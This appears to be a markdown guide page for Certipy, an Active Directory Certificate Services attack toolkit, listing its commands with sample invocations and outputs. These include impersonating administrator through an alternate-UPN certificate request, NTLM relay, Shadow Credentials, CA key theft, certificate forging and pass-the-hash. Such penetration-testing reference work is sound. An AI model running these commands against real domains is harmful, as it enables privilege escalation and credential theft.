@@ -1,0 +1,461 @@
+---
+title: "Certipy"
+description: "Certipy tool guide; includes tool's purpose,primary uses,core features,data sources, common commands and example of command's usages."
+tags: ['windows', 'active directory', 'ad cs', 'credentials']
+---
+
+**Certipy** is an **open-source** toolkit for enumerating and abusing Active Directory Certificate Services (AD CS). It helps penetration testers, red teamers, and defenders identify certificate authority and certificate template misconfigurations that can lead to privilege escalation, persistence, relay attacks, and certificate-based authentication abuse.
+
+**Here are the primary uses of Certipy:**
+
+  * **AD CS Enumeration:** Certipy discovers Enterprise CAs, certificate templates, enrollment permissions, issuance settings, web enrollment endpoints, and vulnerable AD CS configurations.
+
+  * **Vulnerability Identification:** The tool highlights known AD CS escalation paths, including ESC1 through ESC16, and helps users understand whether a template, CA, or enrollment path is dangerous.
+
+  * **Certificate Requests:** Certipy can request certificates from a CA using vulnerable templates, alternate subject information, enrollment agent workflows, RPC, DCOM, or web enrollment methods.
+
+  * **Certificate Authentication:** The tool can authenticate with a PFX certificate, obtain Kerberos tickets through PKINIT, retrieve NT hashes when possible, and support pass-the-certificate workflows.
+
+  * **NTLM Relay to AD CS:** Certipy can relay NTLM authentication to AD CS HTTP or RPC endpoints to request certificates for relayed users or computers.
+
+  * **Post-Exploitation and Persistence:** Certipy supports Shadow Credentials, certificate template modification, CA backup, and Golden Certificate creation when the required privileges or CA private key are available.
+
+
+
+
+## Core Features​
+
+  * AD CS enumeration and template review
+  * ESC misconfiguration detection
+  * Certificate request and authentication workflows
+  * PKINIT and PFX-based authentication support
+  * Shadow credentials and account mapping workflows
+  * Relay-oriented AD CS testing support
+  * JSON output and BloodHound integration helpers
+
+
+
+## Data sources​
+
+  * Active Directory LDAP data
+  * Certificate Authorities and certificate templates
+  * Enrollment permissions and template security descriptors
+  * Kerberos tickets, NTLM hashes, and domain credentials
+  * PFX, PEM, key, and certificate files
+  * AD CS web enrollment and RPC endpoints
+
+
+
+## Common Certipy Commands​
+
+### 1\. Install Certipy with Pip​
+
+  * This command installs Certipy from PyPI. The package name is `certipy-ad`, while the command is usually `certipy`.
+
+
+    
+    
+```
+pip install certipy-ad  
+```
+### 2\. Upgrade Certipy​
+
+  * This command upgrades Certipy to the latest available PyPI release.
+
+
+    
+    
+```
+pip install -U certipy-ad  
+```
+### 3\. Check Certipy Version​
+
+  * This command prints the installed Certipy version.
+
+
+    
+    
+```
+certipy -v  
+```
+### 4\. Show Global Help​
+
+  * This command displays available Certipy actions and global options.
+
+
+    
+    
+```
+certipy -h  
+```
+### 5\. Show Help for a Subcommand​
+
+  * This command displays options for a specific Certipy action.
+
+
+    
+    
+```
+certipy <command> -h  
+```
+### 6\. Basic AD CS Enumeration​
+
+  * This command enumerates certificate authorities, certificate templates, and AD CS configuration with domain credentials.
+
+
+    
+    
+```
+certipy find -u <user@domain.local> -p <password> -dc-ip <dc_ip>  
+```
+### 7\. Save Enumeration as Text​
+
+  * This command writes AD CS enumeration output to text files with the selected prefix.
+
+
+    
+    
+```
+certipy find -u <user@domain.local> -p <password> -dc-ip <dc_ip> -text -output adcs  
+```
+### 8\. Save Enumeration as JSON and CSV​
+
+  * This command creates structured output that can be parsed or imported into other workflows.
+
+
+    
+    
+```
+certipy find -u <user@domain.local> -p <password> -dc-ip <dc_ip> -json -csv -output adcs  
+```
+### 9\. Show Only Enabled Templates​
+
+  * This command filters results to enabled certificate templates.
+
+
+    
+    
+```
+certipy find -u <user@domain.local> -p <password> -dc-ip <dc_ip> -enabled  
+```
+### 10\. Show Only Vulnerable Findings​
+
+  * This command filters output to vulnerable AD CS findings.
+
+
+    
+    
+```
+certipy find -u <user@domain.local> -p <password> -dc-ip <dc_ip> -vulnerable  
+```
+### 11\. Reduce Administrative Noise​
+
+  * This command hides default administrative principals to make low-privilege findings easier to review.
+
+
+    
+    
+```
+certipy find -u <user@domain.local> -p <password> -dc-ip <dc_ip> -hide-admins  
+```
+### 12\. Enumerate Issuance Policies​
+
+  * This command includes certificate issuance policy OIDs in the enumeration output.
+
+
+    
+    
+```
+certipy find -u <user@domain.local> -p <password> -dc-ip <dc_ip> -oids  
+```
+### 13\. Request a Certificate​
+
+  * This command requests a certificate from a selected CA and certificate template.
+
+
+    
+    
+```
+certipy req -u <user@domain.local> -p <password> -dc-ip <dc_ip> -target <ca_host> -ca <ca_name> -template <template_name>  
+```
+### 14\. Request a Certificate with an Alternate UPN​
+
+  * This command requests a certificate with a supplied UPN when the template allows the requester to supply subject information.
+
+
+    
+    
+```
+certipy req -u <user@domain.local> -p <password> -dc-ip <dc_ip> -target <ca_host> -ca <ca_name> -template <template_name> -upn <target_user@domain.local>  
+```
+### 15\. Request a Certificate with UPN and SID​
+
+  * This command includes both UPN and object SID information for certificate mapping scenarios.
+
+
+    
+    
+```
+certipy req -u <user@domain.local> -p <password> -dc-ip <dc_ip> -target <ca_host> -ca <ca_name> -template <template_name> -upn <target_user@domain.local> -sid <target_sid>  
+```
+### 16\. Request on Behalf of Another User​
+
+  * This command uses an enrollment agent workflow to request a certificate on behalf of another account when the environment permits it.
+
+
+    
+    
+```
+certipy req -u <user@domain.local> -p <password> -dc-ip <dc_ip> -target <ca_host> -ca <ca_name> -template <template_name> -on-behalf-of <DOMAIN\\target_user> -pfx <agent.pfx>  
+```
+### 17\. Authenticate with a PFX Certificate​
+
+  * This command authenticates with a certificate and attempts to obtain a Kerberos TGT and NT hash.
+
+
+    
+    
+```
+certipy auth -pfx <certificate.pfx> -dc-ip <dc_ip>  
+```
+### 18\. Authenticate Without Saving a Ticket​
+
+  * This command authenticates with a PFX certificate but avoids saving the Kerberos ticket to disk.
+
+
+    
+    
+```
+certipy auth -pfx <certificate.pfx> -dc-ip <dc_ip> -no-save  
+```
+### 19\. Authenticate and Skip Hash Retrieval​
+
+  * This command authenticates with a PFX certificate but does not request the NT hash.
+
+
+    
+    
+```
+certipy auth -pfx <certificate.pfx> -dc-ip <dc_ip> -no-hash  
+```
+### 20\. Start an AD CS Relay​
+
+  * This command starts Certipy's NTLM relay listener and targets an AD CS HTTP endpoint.
+
+
+    
+    
+```
+certipy relay -target http://<ca_host>  
+```
+### 21\. Relay to a Specific Template​
+
+  * This command relays NTLM authentication and requests a certificate from a selected template.
+
+
+    
+    
+```
+certipy relay -target http://<ca_host> -template <template_name>  
+```
+### 22\. Keep Relay Server Running​
+
+  * This command keeps the relay server alive after one successful relay attempt.
+
+
+    
+    
+```
+certipy relay -target http://<ca_host> -template <template_name> -forever  
+```
+### 23\. Shadow Credentials Automatic Attack​
+
+  * This command attempts a full Shadow Credentials workflow against a target account when the current principal has write rights.
+
+
+    
+    
+```
+certipy shadow auto -u <user@domain.local> -p <password> -dc-ip <dc_ip> -account <target_account>  
+```
+### 24\. List Shadow Credentials​
+
+  * This command lists Key Credential Link entries on a target account.
+
+
+    
+    
+```
+certipy shadow list -u <user@domain.local> -p <password> -dc-ip <dc_ip> -account <target_account>  
+```
+### 25\. Add Shadow Credentials​
+
+  * This command adds a new Key Credential Link entry and saves the related certificate material.
+
+
+    
+    
+```
+certipy shadow add -u <user@domain.local> -p <password> -dc-ip <dc_ip> -account <target_account> -out <output_prefix>  
+```
+### 26\. Remove Shadow Credentials​
+
+  * This command removes a specific Shadow Credentials device ID from the target account.
+
+
+    
+    
+```
+certipy shadow remove -u <user@domain.local> -p <password> -dc-ip <dc_ip> -account <target_account> -device-id <device_guid>  
+```
+### 27\. Backup a CA Private Key​
+
+  * This command backs up the CA certificate and private key when the user has sufficient CA privileges.
+
+
+    
+    
+```
+certipy ca -u <admin@domain.local> -p <password> -ns <dc_ip> -target <ca_host> -config <ca_host\\ca_name> -backup  
+```
+### 28\. List Enabled CA Templates​
+
+  * This command lists certificate templates enabled on a certificate authority.
+
+
+    
+    
+```
+certipy ca -u <user@domain.local> -p <password> -dc-ip <dc_ip> -ca <ca_name> -list-templates  
+```
+### 29\. Enable a Certificate Template​
+
+  * This command enables a template on a CA when the user has CA management permissions.
+
+
+    
+    
+```
+certipy ca -u <user@domain.local> -p <password> -dc-ip <dc_ip> -ca <ca_name> -enable-template <template_name>  
+```
+### 30\. Approve a Pending Request​
+
+  * This command approves a pending certificate request when the user has ManageCertificates permissions.
+
+
+    
+    
+```
+certipy ca -u <user@domain.local> -p <password> -dc-ip <dc_ip> -ca <ca_name> -issue-request <request_id>  
+```
+### 31\. Save a Template Configuration​
+
+  * This command saves the current certificate template configuration to a file before making changes.
+
+
+    
+    
+```
+certipy template -u <user@domain.local> -p <password> -dc-ip <dc_ip> -template <template_name> -save-configuration <template.json>  
+```
+### 32\. Write a Template Configuration​
+
+  * This command writes a template configuration from a file.
+
+
+    
+    
+```
+certipy template -u <user@domain.local> -p <password> -dc-ip <dc_ip> -template <template_name> -write-configuration <template.json>  
+```
+### 33\. Forge a Certificate​
+
+  * This command creates a forged certificate using a compromised CA PFX.
+
+
+    
+    
+```
+certipy forge -ca-pfx <ca.pfx> -upn <target_user@domain.local> -sid <target_sid> -out <forged.pfx>  
+```
+### 34\. Convert Certificate Material to PFX​
+
+  * This command exports a certificate and private key into a PFX file.
+
+
+    
+    
+```
+certipy cert -cert <cert.pem> -key <key.pem> -export -out <output.pfx>  
+```
+### 35\. Parse Offline AD CS Registry Data​
+
+  * This command analyzes exported AD CS registry data offline.
+
+
+    
+    
+```
+certipy parse <registry_export.reg> -format reg -output adcs-offline  
+```
+### 36\. Use Pass-the-Hash Authentication​
+
+  * This command authenticates to AD using an NTLM hash instead of a plaintext password.
+
+
+    
+    
+```
+certipy find -u <user@domain.local> -hashes <lmhash:nthash> -dc-ip <dc_ip>  
+```
+### 37\. Use Kerberos Authentication​
+
+  * This command uses Kerberos authentication from the current ticket cache.
+
+
+    
+    
+```
+certipy find -u <user@domain.local> -k -dc-ip <dc_ip>  
+```
+## Output Examples of Certipy Commands​
+
+Command| Example Usage| Function| Output Example  
+---|---|---|---  
+Install| `pip install certipy-ad`| Installs Certipy.| `Successfully installed certipy-ad`  
+Version| `certipy -v`| Shows installed version.| `Certipy v5.0.0 - by Oliver Lyak (ly4k)`  
+Global Help| `certipy -h`| Lists available actions.| `{account,auth,ca,cert,find,parse,forge,relay,req,shadow,template}`  
+Find| `certipy find -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10`| Enumerates AD CS.| `Certificate Authorities`   
+`Certificate Templates`  
+Text Output| `certipy find -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -text -output adcs`| Saves text report.| `Wrote text output to 'adcs.txt'`  
+JSON Output| `certipy find -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -json -output adcs`| Saves JSON report.| `Wrote JSON output to 'adcs.json'`  
+Vulnerable Only| `certipy find -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -vulnerable`| Shows vulnerable findings.| `[!] Vulnerabilities`   
+`ESC1`  
+Enabled Only| `certipy find -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -enabled`| Filters enabled templates.| `Enabled : True`  
+Hide Admins| `certipy find -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -hide-admins`| Reduces default admin noise.| `Enrollment Rights : CORP\Domain Users`  
+Request Certificate| `certipy req -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -target ca.corp.local -ca CORP-CA -template User`| Requests a certificate.| `[*] Successfully requested certificate`  
+ESC1 Request| `certipy req -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -target ca.corp.local -ca CORP-CA -template User -upn administrator@corp.local`| Requests with supplied UPN.| `[*] Got certificate with UPN 'administrator@corp.local'`  
+PFX Written| `certipy req ... -upn administrator@corp.local`| Saves certificate and key.| `[*] Wrote certificate and private key to 'administrator.pfx'`  
+Authenticate| `certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10`| Authenticates with PFX.| `[*] Got TGT`   
+`[*] Wrote credential cache to 'administrator.ccache'`  
+Hash Retrieval| `certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10`| Retrieves NT hash when possible.| `[*] Got hash for 'administrator@corp.local'`  
+No Save| `certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10 -no-save`| Avoids saving TGT.| `[*] Got TGT`  
+Relay| `certipy relay -target http://ca.corp.local`| Starts relay listener.| `[*] Listening on 0.0.0.0:445`  
+Relay Template| `certipy relay -target http://ca.corp.local -template DomainController`| Relays to a selected template.| `[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp`  
+Shadow Auto| `certipy shadow auto -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -account svc_backup`| Performs automatic Shadow Credentials workflow.| `[*] Added Key Credential Link`   
+`[*] Got TGT`  
+Shadow List| `certipy shadow list -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -account svc_backup`| Lists key credentials.| `Device ID : <guid>`  
+Shadow Remove| `certipy shadow remove -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -account svc_backup -device-id <guid>`| Removes key credential.| `[*] Successfully removed Key Credential Link`  
+CA Backup| `certipy ca -u admin@corp.local -p 'Password123!' -ns 10.0.0.10 -target ca.corp.local -config ca.corp.local\\CORP-CA -backup`| Backs up CA key material.| `[*] Got certificate and private key`   
+`[*] Wrote certificate and private key to 'CORP-CA.pfx'`  
+List Templates| `certipy ca -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -ca CORP-CA -list-templates`| Lists enabled templates.| `User`   
+`Machine`  
+Enable Template| `certipy ca -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -ca CORP-CA -enable-template User`| Enables a template on a CA.| `[*] Enabled certificate template 'User'`  
+Issue Request| `certipy ca -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -ca CORP-CA -issue-request 12`| Approves request.| `[*] Issued certificate request 12`  
+Save Template| `certipy template -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -template User -save-configuration user.json`| Saves template config.| `[*] Saved configuration to 'user.json'`  
+Write Template| `certipy template -u user@corp.local -p 'Password123!' -dc-ip 10.0.0.10 -template User -write-configuration user.json`| Writes template config.| `[*] Successfully updated certificate template`  
+Forge| `certipy forge -ca-pfx CORP-CA.pfx -upn administrator@corp.local -sid S-1-5-21-...-500 -out administrator-forged.pfx`| Creates a forged certificate.| `[*] Wrote forged certificate to 'administrator-forged.pfx'`  
+Cert Export| `certipy cert -cert cert.pem -key key.pem -export -out cert.pfx`| Converts cert and key to PFX.| `[*] Wrote PFX to 'cert.pfx'`  
+Offline Parse| `certipy parse ca.reg -format reg -output adcs-offline`| Parses registry export.| `[*] Wrote output to 'adcs-offline.txt'`  
+Pass the Hash| `certipy find -u user@corp.local -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -dc-ip 10.0.0.10`| Authenticates with hash.| `[*] Finding certificate templates`  
+Kerberos Auth| `certipy find -u user@corp.local -k -dc-ip 10.0.0.10`| Uses Kerberos ticket cache.| `[*] Using Kerberos authentication`
